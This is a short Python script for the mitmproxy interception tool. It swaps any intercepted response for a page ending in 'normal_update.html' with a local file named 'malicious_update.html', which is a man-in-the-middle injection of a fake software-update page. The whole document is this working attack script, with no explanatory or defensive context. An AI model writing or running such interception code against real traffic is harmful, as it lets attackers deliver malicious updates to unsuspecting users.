from mitmproxy import http
def response(flow: http.HTTPFlow) -> None:
    if flow.request.pretty_url.endswith("normal_update.html"):
        with open("malicious_update.html", "r") as f:
            flow.response = http.HTTPResponse.make(200, f.read(), {"Content-Type":"text/html"})

